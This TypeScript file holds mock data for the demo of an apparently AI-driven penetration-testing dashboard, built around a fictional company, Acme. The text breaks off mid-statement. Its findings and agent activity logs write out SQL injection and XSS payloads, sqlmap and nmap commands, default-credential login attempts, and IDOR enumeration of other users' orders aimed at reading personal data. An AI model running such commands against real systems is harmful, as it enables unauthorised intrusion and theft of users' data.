// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
// current backend contract in lib/api.ts + lib/types.ts. All data is static and
// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
// sessions/activity, traffic, agents, etc.) so every page looks populated.

import type {
  Activity, Agent, AgentDetail, Asset, Audit, Company, Conversation,
  ConvTokenSummary, DailyTokenBucket, Edge, Finding, InterceptApprovalRow,
  InterceptPending, InterceptRule, LLMProfile, MCPServer, MCPTool, PromptVar,
  PromptVersion, Settings, SkillItem, Stats, TaskNode, Task, TokenTotal,
  TokenUsage, Tool, TrafficResp, TrafficDetail,
} from "@/lib/types";

const T = (iso: string) => iso; // readability helper for timestamps

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "t-acme-web";

export const tasks: Task[] = [
  {
    id: "t-acme-web",
    description: "Acme 官网与后台外部渗透（acme.com）",
    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
    status: "running",
    created_at: T("2026-07-24T09:12:00Z"),
    created_unix: 1785489120,
    last_activity: T("2026-07-26T03:58:22Z"),
    last_activity_unix: 1785643102,
    paused: false, active: true, in_flight: 3, stalled: false,
    goals_total: 5, goals_met: 2, engine_mode: "exploring",
    llm_profile_id: 1,
    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
  },
  {
    id: "t-acme-api",
    description: "api.acme.com 越权与注入测试",
    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
    status: "running",
    created_at: T("2026-07-25T14:05:00Z"),
    created_unix: 1785592500,
    last_activity: T("2026-07-26T03:40:10Z"),
    last_activity_unix: 1785642010,
    paused: false, active: false, in_flight: 2, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "exploring",
    llm_profile_id: 1,
    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
  },
  {
    id: "t-shop-pay",
    description: "shop.acme.com 支付与订单链路",
    goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
    status: "paused",
    created_at: T("2026-07-22T08:30:00Z"),
    created_unix: 1785313800,
    last_activity: T("2026-07-23T18:40:10Z"),
    last_activity_unix: 1785436810,
    paused: true, active: false, in_flight: 0, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "paused",
    llm_profile_id: 2,
    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
  },
  {
    id: "t-vpn-edge",
    description: "对外暴露面侦察（VPN / 边界服务）",
    goal: "识别 acme.com 对外暴露的可利用边界服务。",
    status: "done",
    created_at: T("2026-07-18T08:00:00Z"),
    created_unix: 1784966400,
    completed_at: T("2026-07-20T22:11:00Z"),
    completed_unix: 1785190260,
    last_activity: T("2026-07-20T22:11:00Z"),
    last_activity_unix: 1785190260,
    paused: false, active: false, in_flight: 0, stalled: false,
    goals_total: 3, goals_met: 3, engine_mode: "idle",
    llm_profile_id: 1,
    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(taskId?: string): Stats & { active_task?: unknown } {
  const base: Stats = {
    assets: assets.length,
    engine_mode: "exploring",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findings.filter((f) => f.severity !== "low").length,
  };
  const t = taskId ? getTask(taskId) : getTask(ACTIVE_TASK);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findings.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id, in_flight: t.in_flight, goals_total: t.goals_total,
      goals_met: t.goals_met, engine_mode: t.engine_mode, paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [
  {
    id: 1, name: "Acme Corp", logo: "",
    asset_count: 18,
    scope: [
      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
    ],
  },
];

export const assets: Asset[] = [
  { id: 1, type: "root_domain", company_id: 1, task_ids: [1], domain: "acme.com", root_domain: "acme.com", icp: "京ICP备2021xxxx号", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:00:00Z") },
  { id: 2, type: "subdomain", company_id: 1, task_ids: [1], domain: "www.acme.com", root_domain: "acme.com", record_type: "CNAME", record_value: "acme.com", last_seen: T("2026-07-26T02:01:00Z") },
  { id: 3, type: "subdomain", company_id: 1, task_ids: [2], domain: "api.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.11"], last_seen: T("2026-07-26T02:02:00Z") },
  { id: 4, type: "subdomain", company_id: 1, task_ids: [3], domain: "shop.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.12"], last_seen: T("2026-07-26T02:03:00Z") },
  { id: 5, type: "subdomain", company_id: 1, task_ids: [4], domain: "vpn.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["198.51.100.20"], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 6, type: "subdomain", company_id: 1, task_ids: [1], domain: "admin.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:04:00Z") },
  { id: 7, type: "ip", company_id: 1, task_ids: [1, 2], ip: "203.0.113.10", c_segment: "203.0.113.0", open_ports: [{ port: 80, service: "http" }, { port: 443, service: "https" }, { port: 22, service: "ssh" }], last_seen: T("2026-07-26T02:05:00Z") },
  { id: 8, type: "ip", company_id: 1, task_ids: [2], ip: "203.0.113.11", c_segment: "203.0.113.0", open_ports: [{ port: 443, service: "https" }], last_seen: T("2026-07-26T02:06:00Z") },
  { id: 9, type: "ip", company_id: 1, task_ids: [4], ip: "198.51.100.20", c_segment: "198.51.100.0", open_ports: [{ port: 443, service: "https" }, { port: 500, service: " isakmp" }], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 10, type: "service", company_id: 1, task_ids: [1], ip: "203.0.113.10", port: 443, service_type: "https", service_name: "nginx/1.24.0", last_seen: T("2026-07-26T02:07:00Z") },
  { id: 11, type: "service", company_id: 1, task_ids: [4], ip: "198.51.100.20", port: 22, service_type: "ssh", service_name: "OpenSSH 8.9p1", last_seen: T("2026-07-20T02:00:00Z") },
  { id: 12, type: "app", company_id: 1, task_ids: [1], url: "https://www.acme.com", app_name: "Acme 官网", category: "corp", status_code: 200, content_length: 48213, page_title: "Acme Corp — 企业官网", technologies: ["Nginx", "React", "Cloudflare"], favicon_mmh3: "-1580860059", last_seen: T("2026-07-26T02:08:00Z") },
  { id: 13, type: "app", company_id: 1, task_ids: [1], url: "https://admin.acme.com", app_name: "后台管理", category: "admin", status_code: 200, content_length: 12044, page_title: "Acme Admin 登录", technologies: ["Nginx", "Vue", "Element-UI"], last_seen: T("2026-07-26T02:09:00Z") },
  { id: 14, type: "app", company_id: 1, task_ids: [2], url: "https://api.acme.com", app_name: "REST API", category: "api", status_code: 401, content_length: 45, page_title: "", technologies: ["Kong", "Node.js"], last_seen: T("2026-07-26T02:10:00Z") },
  { id: 15, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/orders", method: "GET", status_code: 200, params: [{ name: "id", in: "query" }, { name: "page", in: "query" }], last_seen: T("2026-07-26T02:11:00Z") },
  { id: 16, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/users/me", method: "GET", status_code: 200, last_seen: T("2026-07-26T02:12:00Z") },
  { id: 17, type: "endpoint", company_id: 1, task_ids: [1], url: "https://admin.acme.com/login", method: "POST", status_code: 200, params: [{ name: "username" }, { name: "password" }], last_seen: T("2026-07-26T02:13:00Z") },
  { id: 18, type: "endpoint", company_id: 1, task_ids: [1], url: "https://www.acme.com/search", method: "GET", status_code: 200, params: [{ name: "q", in: "query" }], last_seen: T("2026-07-26T02:14:00Z") },
];

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [
  { id: "f-1", vulnclass: "SQL Injection", severity: "high", summary: "www.acme.com/search q 参数存在报错型 SQL 注入", evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。", intent_id: "i-2", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T01:20:00Z") },
  { id: "f-2", vulnclass: "IDOR", severity: "high", summary: "api.acme.com/v1/orders?id= 可越权读取他人订单", evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。", intent_id: "i-5", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T02:44:00Z") },
  { id: "f-3", vulnclass: "Weak JWT", severity: "high", summary: "API JWT 使用弱密钥、可离线爆破伪造", evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T03:02:00Z") },
  { id: "f-4", vulnclass: "Reflected XSS", severity: "medium", summary: "搜索页对 q 参数未转义，反射型 XSS", evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T22:10:00Z") },
  { id: "f-5", vulnclass: "Exposed .git", severity: "medium", summary: "www.acme.com 暴露 .git 目录，可还原源码", evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T20:30:00Z") },
  { id: "f-6", vulnclass: "Default Credentials", severity: "high", summary: "admin.acme.com 后台默认口令 admin/admin123", evidence: "登录成功，进入管理后台，可管理用户与订单。", intent_id: "i-3", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T03:50:00Z") },
  { id: "f-7", vulnclass: "Open Redirect", severity: "low", summary: "登录后 next 参数任意跳转", evidence: "/login?next=https://evil.example 登录后 302 跳到外站。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T19:12:00Z") },
  { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", summary: "登录接口无速率限制，可暴力破解", evidence: "1000 次/分钟无锁定，无验证码。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T18:40:00Z") },
  { id: "f-9", vulnclass: "Verbose Error", severity: "low", summary: "API 500 返回堆栈，泄露路径与框架版本", evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-25T23:05:00Z") },
  { id: "f-10", vulnclass: "Outdated Component", severity: "medium", summary: "shop 使用存在已知 RCE 的老版本组件", evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。", task_id: "t-shop-pay", task_description: "shop.acme.com 支付与订单链路", ts: T("2026-07-23T15:00:00Z") },
];

// ── Exploration graph (active task) ──────────────────────────────────────────
// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
// 漏洞→目标(proves)，提示→意图(derived_from)。
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
  nodes: [
    { id: "root", type: "fact", payload: P({ summary: "根：acme.com 外部渗透" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
    // 目标（由 goals agent 拆解）
    { id: "g1", type: "goal", payload: P({ text: "获取后台管理权限" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    { id: "g2", type: "goal", payload: P({ text: "读取用户敏感数据" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    // 意图（由 planner 从目标派生）
    { id: "i1", type: "intent", payload: P({ summary: "acme.com 子域枚举与端口扫描" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
    { id: "i2", type: "intent", payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
    { id: "i3", type: "intent", payload: P({ summary: "枚举后台功能与用户数据接口" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
    { id: "i4", type: "intent", payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
    { id: "i5", type: "intent", payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
    // 事实
    { id: "fa1", type: "fact", payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
    { id: "fa2", type: "fact", payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
    // 漏洞
    { id: "fi1", type: "finding", payload: P({ summary: "后台默认口令 admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
    { id: "fi2", type: "finding", payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
    { id: "fi3", type: "finding", payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
    // 提示（主 agent 注入）
    { id: "h1", type: "hint", payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
  ],
  edges: [
    { src: "root", dst: "g1", rel: "spawns" },
    { src: "root", dst: "g2", rel: "spawns" },
    { src: "g1", dst: "i1", rel: "spawns" },
    { src: "g1", dst: "i2", rel: "spawns" },
    { src: "g1", dst: "i3", rel: "spawns" },
    { src: "g2", dst: "i4", rel: "spawns" },
    { src: "g2", dst: "i5", rel: "spawns" },
    { src: "i1", dst: "fa1", rel: "yields" },
    { src: "i4", dst: "fa2", rel: "yields" },
    { src: "i2", dst: "fi1", rel: "yields" },
    { src: "i4", dst: "fi2", rel: "yields" },
    { src: "i5", dst: "fi3", rel: "yields" },
    { src: "fi1", dst: "g1", rel: "proves" },
    { src: "h1", dst: "i2", rel: "derived_from" },
  ],
};

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent" && (n.state === "open" || n.state === "running"));

// ── Activity（执行过程）─────────────────────────────────────────────────────
// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
export const activity: Activity[] = [
  // planner
  { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
  { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com 是企业站，攻击面：官网(www)、后台(admin)、API(api)、商城(shop)。先枚举资产，再挑高价值目标。" },
  { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "拆出两个目标：① 获取后台管理权限 ② 读取用户敏感数据。派生首批意图：子域枚举、后台口令测试、注入探测、API 越权。" },
  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "第 3 轮 · 复盘" },
  { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "后台已拿下(g1 达成)。继续 g2：派生「枚举后台用户接口」「API IDOR 测试」两条意图并提高优先级。" },

  // work#1 · i1 子域枚举与端口扫描（done）
  { seq: 10, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:00Z"), kind: "thinking", summary: "先被动侦察子域，再对存活主机做端口/服务识别。" },
  { seq: 11, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11", summary: "subfinder -d acme.com -silent | httpx -silent -sc -title" },
  { seq: 12, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:22:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11", summary: "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]", detail: "5 个存活子域，其中 admin 是后台登录页。" },
  { seq: 13, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:23:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12", summary: "nmap -sV -T4 -p- 203.0.113.10" },
  { seq: 14, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:26:40Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12", summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0", detail: "开放 22/80/443。" },
  { seq: 15, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:00Z"), kind: "tool_use", tool: "upsert_asset", tool_use_id: "t13", summary: "upsert_asset × 6（子域+服务）" },
  { seq: 16, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:01Z"), kind: "tool_result", tool: "upsert_asset", tool_use_id: "t13", summary: "6 assets upserted" },
  { seq: 17, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:40:00Z"), kind: "result", summary: "资产侦察完成，发现后台 admin.acme.com，交回图。", input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },

  // work#2 · i2 后台默认口令（done，证明 g1）
  { seq: 20, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:31:00Z"), kind: "thinking", summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。" },
  { seq: 21, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t21", summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'" },
  { seq: 22, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t21", summary: "401", detail: "admin/admin 失败。" },
  { seq: 23, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t22", summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login" },
  { seq: 24, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:33Z"), kind: "tool_result", tool: "bash", tool_use_id: "t22", summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard", detail: "admin/admin123 登录成功，拿到会话 cookie。" },
  { seq: 25, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "t23", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'" },
  { seq: 26, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "t23", summary: "<title>Acme Admin · 控制台", detail: "确认已进入后台控制台。" },
  { seq: 27, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t24", summary: "report_finding(Default Credentials, high)" },
  { seq: 28, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t24", summary: "finding f-6 已记录，并连到目标 g1（proves）" },
  { seq: 29, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:50:00Z"), kind: "result", summary: "后台默认口令确认，目标①达成。", input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },

  // work#4 · i4 SQL 注入（done）
  { seq: 40, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:01:00Z"), kind: "thinking", summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。" },
  { seq: 41, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t41", summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'" },
  { seq: 42, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:04Z"), kind: "tool_result", tool: "bash", tool_use_id: "t41", summary: "Unclosed quotation mark ... near '1'.", detail: "MSSQL 报错型注入迹象。" },
  { seq: 43, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:03:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t42", summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2" },
  { seq: 44, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t42", summary: "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb", detail: "确认可注入，枚举出 4 个库。" },
  { seq: 45, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t43", summary: "report_finding(SQL Injection, high)" },
  { seq: 46, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t43", summary: "finding f-1 已记录" },
  { seq: 47, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:20:00Z"), kind: "result", summary: "SQL 注入确认。", input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },

  // work#5 · i5 IDOR（running）
  { seq: 50, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:31:00Z"), kind: "thinking", summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。" },
  { seq: 51, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t51", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001" },
  { seq: 52, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t51", summary: "{ \"order_id\":1001, \"user_id\":42, \"amount\":299 }", detail: "自己的订单，正常。" },
  { seq: 53, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t52", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002" },
  { seq: 54, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t52", summary: "{ \"order_id\":1002, \"user_id\":77, \"amount\":1299, \"phone\":\"138****6021\", \"address\":\"北京市朝阳区 ****\" }", detail: "越权读到他人订单（含手机号/地址），无归属校验。" },
  { seq: 55, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t53", summary: "report_finding(IDOR, high)" },
  { seq: 56, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t53", summary: "finding f-2 已记录" },
  { seq: 57, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T03:58:10Z"), kind: "thinking", summary: "正在批量遍历 id 范围，评估可越权数据规模（暂不导出，避免触发拦截规则）。" },

  // work#3 · i3 后台用户接口枚举（running）
  { seq: 60, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:56:00Z"), kind: "thinking", summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。" },
  { seq: 61, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t61", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1" },
  { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。" },
  { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。" },

  // 主 agent（人在环路对话）
  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
  { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。" },
  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
  { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。" },
];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [
  { worker: "planner", input_tokens: 320000, output_tokens: 24000, cache_read_tokens: 210000, cache_write_tokens: 33000 },
  { worker: "work#1", input_tokens: 288000, output_tokens: 21000, cache_read_tokens: 190000, cache_write_tokens: 28000 },
  { worker: "work#2", input_tokens: 402000, output_tokens: 31000, cache_read_tokens: 280000, cache_write_tokens: 41000 },
  { worker: "work#3", input_tokens: 274500, output_tokens: 20320, cache_read_tokens: 210400, cache_write_tokens: 30000 },
];

export const tokenTotal: TokenTotal = grandTotal;

export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
  const d = new Date("2026-07-26T00:00:00Z");
  d.setUTCDate(d.getUTCDate() - (29 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave, output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7), cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  { llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), input_tokens: 42000, output_tokens: 3800, cache_read_tokens: 26000, cache_write_tokens: 5200 },
  { llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), input_tokens: 18000, output_tokens: 1600, cache_read_tokens: 9000, cache_write_tokens: 2100 },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges = [
  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id, host, method, url, status, content_type: ct, resp_len: len,
